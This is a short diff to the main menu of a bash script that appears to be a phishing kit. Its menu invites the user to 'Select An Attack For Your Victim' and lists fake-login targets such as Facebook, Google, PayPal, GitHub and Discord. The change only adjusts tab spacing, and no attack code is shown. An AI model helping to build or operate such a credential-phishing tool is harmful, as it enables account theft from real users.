@@ -740,9 +740,9 @@ main_menu() {
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Facebook		${MAGENTA}[${CYAN}05${MAGENTA}]${BLUE} Paypal		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Xbox
-		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Instagram	${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Tiktok		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} GitHub
+		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Instagram		${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Tiktok		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} GitHub
 		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Google		${MAGENTA}[${CYAN}07${MAGENTA}]${BLUE} Snapchat		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Discord
-		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Microsoft	${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Spotify		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Roblox
+		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Microsoft		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Spotify		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Roblox
 
 		${MAGENTA}[${CYAN}99${MAGENTA}]${BLUE} About         ${MAGENTA}[${CYAN}00${MAGENTA}]${BLUE} Exit
 
